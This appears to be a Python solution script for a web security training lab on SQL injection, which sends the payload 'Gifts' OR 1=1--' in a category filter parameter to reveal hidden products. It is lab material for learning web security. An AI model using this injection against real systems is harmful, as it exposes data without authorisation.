# Lab: SQL injection WHERE clause - retrieving hidden data
# Vulnerability: category parameter unsanitized
# Approach: Observed URL structure → tested ' to confirm SQLi
#           → OR 1=1-- to return all products including unreleased
# Payload: category=Gifts' OR 1=1--

import requests


url = "https://0a86008a044ad29e8006a8dc00b200af.web-security-academy.net/filter?category=Gifts'+OR+1=1--"
answer = requests.get(url)
print(answer.text)
